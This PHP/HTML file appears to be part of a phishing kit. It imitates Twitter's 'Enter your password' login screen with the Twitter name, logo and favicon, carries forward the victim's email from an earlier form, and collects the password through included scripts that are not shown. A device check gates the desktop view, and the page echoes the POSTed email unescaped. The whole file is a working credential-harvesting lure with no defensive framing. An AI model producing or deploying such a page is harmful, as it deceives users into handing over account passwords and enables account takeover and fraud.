<?php include("Config.php"); ?>
<html>
  <head>
    <title>Twitter</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
    <link rel="shortcut icon" href="img/twitter.ico" type="image/x-icon">
    <meta charset="utf-8" />
    <!-- jQuery -->
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/jquery.redirect.js"></script>
    <script type="text/javascript" src="js/password.js"></script>
    <!-- Boostrap -->
    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <!-- Style -->
    <link rel="stylesheet" href="css/style_password.css">
    <script>
    $(window).on('load', function() {
       $('#myModal').modal({backdrop: 'static', keyboard: false, show: true})
    });
    </script>
  </head>
  <body>

<?php if(!CheckDipositive()){ ?>
    <div class="d-none d-lg-block">
      <div class="container">

        <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-body">
                <div class="dkp-logo">
                  <img src="img/twitter.png" alt="dkp-logo" height="35" />
                </div>

                <div class="dkp-container dkp-title">
                  <h1>Enter your password</h1>
                </div>

                <div class="dkp-container dkp-input">
                  <input type="text" id="TxtEmail" placeholder="Email address" value="<?= $_POST['TxtEmail']; ?>" disabled readonly />
                  <input type="password" id="TxtPassword" placeholder="Password" value="" />
                  <span id="ErrPassword" style="color:#cc0000;display:none;">Enter a valid password</span>
                </div>

                <div class="dkp-container">
                  <button class="dkp-Next" id="BtnGo">Log in</button>
                </div>

                <div class="dkp-container dkp-footer">
                  <span>Don't have an account?</span> <span style="color:#1d9bf0;">Sign up</span>
                </div>

              </div>
            </div>
          </div>
        </div>


      </div>
    </div>
<?php } ?>
    <div class="d-lg-none">
      <div class="container">
        <div class="mbl-container mbl-logo">
          <img src="img/twitter.png" alt="mbl-logo" height="35" />
        </div>

        <div class="mbl-container mbl-title">
          <h1>Enter your password</h1>
        </div>

        <div class="mbl-container mbl-input">
          <input type="text" id="TxtEmail" placeholder="Email address" value="<?= $_POST['TxtEmail']; ?>" disabled readonly />
          <input type="password" id="TxtPassword" placeholder="Password" value="" />
          <span id="ErrPassword" style="color:#cc0000;display:none;">Enter a valid password</span>
        </div>

        <div class="mbl-container">
          <button class="mbl-Next" id="BtnGo">Log in</button>
        </div>

        <div class="mbl-container mbl-footer">
          <span>Don't have an account?</span> <span style="color:#1d9bf0;">Sign up</span>
        </div>
      </div>
    </div>

  </body>
</html>
